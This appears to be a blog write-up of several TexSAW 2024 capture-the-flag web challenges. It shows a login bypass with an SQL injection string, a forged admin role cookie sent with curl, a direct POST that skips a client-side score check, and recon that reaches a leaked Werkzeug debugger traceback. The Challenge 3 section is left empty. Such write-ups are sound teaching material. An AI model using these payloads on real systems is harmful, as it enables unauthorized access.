### TexSAW 2024

### Challenges
- Web
  - Login Attempt
  - Crazy Cookie
  - Extreme Security
  - Over 9000
  - Ask, and it shall be given to you

### Challenge 1: Login Attempt

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/b56385c4-6a19-48c3-9141-f62b089907d0)

- The challenge is a basic sql injection challenge which requires bypassing a login page.I bypassed the login page with a true sql statement `' or 1=1--+`.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/881b97ae-b2a5-44c1-8cf8-3a073fa2fba9)

- Flag

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/582ef905-850d-421f-afa6-30e09a32c793)

### Challenge 2: Crazy Cookie

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/61d8f77f-ea45-4d9f-8bad-e5aae4d212d2)

- The challenge's objective is to bypass this login page.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/35f367af-e620-4897-8fb7-f0d3a025986a)

- After analyzing the response of the response with curl, I noticed that the cookie contains a key 'role' with the value 'user'.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3970f7f8-e7d5-4462-a10e-7e7e81bc9892)

- I got the flag by setting the `role` value to admin

          ❯ curl http://3.23.56.243:9002/ -H 'Cookie: role=admin; Path=/'
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Flag</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    margin: 0;
                    padding: 0;
                    background-color: #f3f3f3;
                }
                .container {
                    max-width: 600px;
                    margin: 50px auto;
                    background-color: #fff;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    padding: 20px;
                }
                h1 {
                    color: #4CAF50;
                    margin-top: 0;
                }
                .flag {
                    font-size: 24px;
                    color: #FF5722; /* Orange color */
                    margin-top: 20px;
                    padding: 10px;
                    border: 2px solid #FF5722; /* Orange border */
                    border-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Flag!</h1>
                <div class="flag">
                    texsaw{cR@zy_c00Ki3}
                </div>
            </div>
        </body>
        </html>           
        

### Challenge 3: Extreme Security

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1deae3cb-e7b9-4295-b4dc-4e95ff32f7c4)

- In this challenge, the site will only allow requests from this origin `https://texsaw2024.com` will be allowed which means  Cross Origin Resource Sharing configuration pf the site is set to the url above.A request made by a url `http://texsaw2024.com` will be restricted because of the `http://` protocol in the url

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4c908f0f-bacd-4db5-a456-95dc6e03c502)

- 






### Challenge 4: Over 9000

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/92c0a2fd-a501-41c9-9336-c9bb5e303a47)

- In this challenge, players will only be granted the flag if they score an energy of over 9000 energy.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d04caa09-d7eb-42a8-a286-b235e558884d)

- The challenge contains a javascript code located in a file `9000.js`

  
      let currentEnergy = 0;
      
      function gatheringEnergy(){
          currentEnergy++;
          $("#energycount").html(`${currentEnergy}`);
          if(currentEnergy == 10)
          {
              alert("out of energy try again :(")
              currentEnergy = 0;
              $("#energycount").html(0);
              
          }
          else if (currentEnergy > 9000)
          {
              
              $.ajax({
                  type:"POST",
                  url:"kamehameha.php",
                  data:{energy: currentEnergy},
                  success: function(flag){
                      alert(`${flag}`);
                  },
                  error: function(responseText,status, error){
                      console.log(`Tell the infrastructure team to fix this: Status = ${status} ; Error = ${error}`);
                  }
      
      
              })
              
          }
      }
 - The code snippet states that if the `currentEnergy` variable is greater than 9000, a POST request with data stating the amount of current energy is made to another page `kamehameha.php` which grants us the flag. Instead of playing the game, we can just make a request to the `kamehameha.php` page with an energy greater than 9000 to get the flag.

          ❯ curl http://3.23.56.243:9005/kamehameha.php -d "energy=90000" -X POST
        texsaw{y0u_th0ught_th1s_w4s_4_fl4g_but_1t_w4s_m3_d10}

Challenge 5: Ask and it shall be given to you

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/7742c1ce-594b-47d8-9b24-d88d7ac59334)

- The index page presented a message stating that the website is down

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/eb2920c6-7343-4abf-80d5-2b3bf4a253b6)

- I fuzzed for pages with ffuf and I got 3 hits.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f39fcf8d-c358-48ba-af93-8f021f8cdc6b)

- Checking `robots.txt` reveals 2 hidden pages

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/7f9b173e-5cd1-4735-bbe1-f5c019af1549)

- The ContactIT page welcomes me with a message that states `Post:Json Request Only`.I made a request to the url with json data with curl and I got an error revealing the source code of the web app which is in python.

  CURL request:

  `curl http://3.23.56.243:9008/contactIT -H 'Content-Type: application/json' -d '{"milk": "sleep"}'`

  Response/Error:
        
           <!doctype html>
        <html lang=en>
          <head>
            <title>TypeError: argument of type &#39;NoneType&#39; is not iterable
         // Werkzeug Debugger</title>
            <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
            <link rel="shortcut icon"
                href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
            <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
            <script>
              var CONSOLE_MODE = false,
                  EVALEX = true,
                  EVALEX_TRUSTED = false,
                  SECRET = "WYleT8qx5TNo2HMQyp6Q";
            </script>
          </head>
          <body style="background-color: #fff">
            <div class="debugger">
        <h1>TypeError</h1>
        <div class="detail">
          <p class="errormsg">TypeError: argument of type &#39;NoneType&#39; is not iterable
        </p>
        </div>
        <h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
        <div class="traceback">
          <h3></h3>
          <ul><li><div class="frame" id="frame-140077666069248">
          <h4>File <cite class="filename">"/usr/local/lib/python3.12/site-packages/flask/app.py"</cite>,
              line <em class="line">1488</em>,
              in <code class="function">__call__</code></h4>
          <div class="source library"><pre class="line before"><span class="ws">    </span>) -&gt; cabc.Iterable[bytes]:</pre>
        <pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
        <pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
        <pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
        <pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
        <pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)
        <span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
        </div>
        
        <li><div class="frame" id="frame-140077666069104">
          <h4>File <cite class="filename">"/usr/local/lib/python3.12/site-packages/flask/app.py"</cite>,
              line <em class="line">1466</em>,
              in <code class="function">wsgi_app</code></h4>
          <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
        <pre class="line before"><span class="ws">                </span>ctx.push()</pre>
        <pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
        <pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
        <pre class="line before"><span class="ws">                </span>error = e</pre>
        <pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)
        <span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^</pre>
        <pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
        <pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
        <pre class="line after"><span class="ws">                </span>raise</pre>
        <pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
        <pre class="line after"><span class="ws">        </span>finally:</pre></div>
        </div>
        
        <li><div class="frame" id="frame-140077666069392">
          <h4>File <cite class="filename">"/usr/local/lib/python3.12/site-packages/flask/app.py"</cite>,
              line <em class="line">1463</em>,
              in <code class="function">wsgi_app</code></h4>
          <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
        <pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
        <pre class="line before"><span class="ws">        </span>try:</pre>
        <pre class="line before"><span class="ws">            </span>try:</pre>
        <pre class="line before"><span class="ws">                </span>ctx.push()</pre>
        <pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()
        <span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
        <pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
        <pre class="line after"><span class="ws">                </span>error = e</pre>
        <pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
        <pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
        <pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
        </div>
        
        <li><div class="frame" id="frame-140077666069536">
          <h4>File <cite class="filename">"/usr/local/lib/python3.12/site-packages/flask/app.py"</cite>,
              line <em class="line">872</em>,
              in <code class="function">full_dispatch_request</code></h4>
          <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
        <pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
        <pre class="line before"><span class="ws">            </span>if rv is None:</pre>
        <pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
        <pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
        <pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)
        <span class="ws">            </span>     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
        <pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
        <pre class="line after"><span class="ws"></span> </pre>
        <pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
        <pre class="line after"><span class="ws">        </span>self,</pre>
        <pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
        </div>
        
        <li><div class="frame" id="frame-140077666069680">
          <h4>File <cite class="filename">"/usr/local/lib/python3.12/site-packages/flask/app.py"</cite>,
              line <em class="line">870</em>,
              in <code class="function">full_dispatch_request</code></h4>
          <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
        <pre class="line before"><span class="ws">        </span>try:</pre>
        <pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
        <pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
        <pre class="line before"><span class="ws">            </span>if rv is None:</pre>
        <pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()
        <span class="ws">                </span>     ^^^^^^^^^^^^^^^^^^^^^^^</pre>
        <pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
        <pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
        <pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
        <pre class="line after"><span class="ws"></span> </pre>
        <pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
        </div>
        
        <li><div class="frame" id="frame-140077666069824">
          <h4>File <cite class="filename">"/usr/local/lib/python3.12/site-packages/flask/app.py"</cite>,
              line <em class="line">855</em>,
              in <code class="function">dispatch_request</code></h4>
          <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
        <pre class="line before"><span class="ws">        </span>):</pre>
        <pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
        <pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
        <pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
        <pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
        <span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
        <pre class="line after"><span class="ws"></span> </pre>
        <pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
        <pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
        <pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
        <pre class="line after"><span class="ws">        </span>error handling.</pre></div>
        </div>
        
        <li><div class="frame" id="frame-140077666069968">
          <h4>File <cite class="filename">"/app/webapp.py"</cite>,
              line <em class="line">26</em>,
              in <code class="function">submitted</code></h4>
          <div class="source "><pre class="line before"><span class="ws">    </span>if request.method == &#39;POST&#39;:</pre>
        <pre class="line before"><span class="ws">        </span>content = request.get_json()</pre>
        <pre class="line before"><span class="ws">        </span>sender = content.get(&#39;email&#39;)</pre>
        <pre class="line before"><span class="ws">        </span>messege = content.get(&#39;messege&#39;)</pre>
        <pre class="line before"><span class="ws">        </span>f.setSender(sender)</pre>
        <pre class="line current"><span class="ws">        </span>f.checkResponds(messege)
        <span class="ws">        </span>^^^^^^^^^^^^^^^^^^^^^^^^</pre>
        <pre class="line after"><span class="ws">    </span>else:</pre>
        <pre class="line after"><span class="ws">        </span>return &#34;Post:Json Request Only&#34;</pre>
        <pre class="line after"><span class="ws">    </span>return &#34;Email Sent!&#34;</pre>
        <pre class="line after"><span class="ws"></span> </pre>
        <pre class="line after"><span class="ws"></span>@app.route(&#34;/countdown&#34;)</pre></div>
        </div>
        
        <li><div class="frame" id="frame-140077666070112">
          <h4>File <cite class="filename">"/app/floaty.py"</cite>,
              line <em class="line">17</em>,
              in <code class="function">checkResponds</code></h4>
          <div class="source "><pre class="line before"><span class="ws">    </span>def setSender(self, email):</pre>
        <pre class="line before"><span class="ws">        </span>self.sendto = email</pre>
        <pre class="line before"><span class="ws"></span> </pre>
        <pre class="line before"><span class="ws"></span>#Check Responds for flag or fake</pre>
        <pre class="line before"><span class="ws">    </span>def checkResponds(self, responds):</pre>
        <pre class="line current"><span class="ws">        </span>if &#34;flag&#34; in responds:
        <span class="ws">        </span>   ^^^^^^^^^^^^^^^^^^</pre>
        <pre class="line after"><span class="ws">            </span>self.sendFlag()</pre>
        <pre class="line after"><span class="ws">        </span>else:</pre>
        <pre class="line after"><span class="ws">            </span>self.sendFake()</pre>
        <pre class="line after"><span class="ws"></span> </pre>
        <pre class="line after"><span class="ws"></span>#Send Flag if requested</pre></div>
        </div>
        </ul>
          <blockquote>TypeError: argument of type &#39;NoneType&#39; is not iterable
        </blockquote>
        </div>
        
        <div class="plain">
            <p>
              This is the Copy/Paste friendly version of the traceback.
            </p>
            <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
          File &#34;/usr/local/lib/python3.12/site-packages/flask/app.py&#34;, line 1488, in __call__
            return self.wsgi_app(environ, start_response)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          File &#34;/usr/local/lib/python3.12/site-packages/flask/app.py&#34;, line 1466, in wsgi_app
            response = self.handle_exception(e)
                       ^^^^^^^^^^^^^^^^^^^^^^^^
          File &#34;/usr/local/lib/python3.12/site-packages/flask/app.py&#34;, line 1463, in wsgi_app
            response = self.full_dispatch_request()
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          File &#34;/usr/local/lib/python3.12/site-packages/flask/app.py&#34;, line 872, in full_dispatch_request
            rv = self.handle_user_exception(e)
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          File &#34;/usr/local/lib/python3.12/site-packages/flask/app.py&#34;, line 870, in full_dispatch_request
            rv = self.dispatch_request()
                 ^^^^^^^^^^^^^^^^^^^^^^^
          File &#34;/usr/local/lib/python3.12/site-packages/flask/app.py&#34;, line 855, in dispatch_request
            return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          File &#34;/app/webapp.py&#34;, line 26, in submitted
            f.checkResponds(messege)
          File &#34;/app/floaty.py&#34;, line 17, in checkResponds
            if &#34;flag&#34; in responds:
               ^^^^^^^^^^^^^^^^^^^
        TypeError: argument of type &#39;NoneType&#39; is not iterable
        </textarea>
        </div>
        <div class="explanation">
          The debugger caught an exception in your WSGI application.  You can now
          look at the traceback which led to the error.  <span class="nojavascript">
          If you enable JavaScript you can also use additional features such as code
          execution (if the evalex feature is enabled), automatic pasting of the
          exceptions and much more.</span>
        </div>
              <div class="footer">
                Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
                friendly Werkzeug powered traceback interpreter.
              </div>
            </div>
        
            <div class="pin-prompt">
              <div class="inner">
                <h3>Console Locked</h3>
                <p>
                  The console is locked and needs to be unlocked by entering the PIN.
                  You can find the PIN printed out on the standard output of your
                  shell that runs the server.
                <form>
                  <p>PIN:
                    <input type=text name=pin size=14>
                    <input type=submit name=btn value="Confirm Pin">
                </form>
              </div>
            </div>
          </body>
        </html>
        
- To get the flag, the json data must contain a key['email'] with the value of your email and another key['messege'] with the word "flag" to get an email containing the flag. If successful, a message 'Email sent' will be sent to the user.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3550e573-2ac1-4815-8bfa-2cc6d2519b44)

- Curl request to get the flag

        ❯ curl http://3.23.56.243:9008/contactIT -H 'Content-Type: application/json' -d '{"email": "**************","messege": "flag"}'
      Email Sent! 

- Flag received via mail

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/52efde8a-5ff8-4034-b578-578fcd282719)



    


   
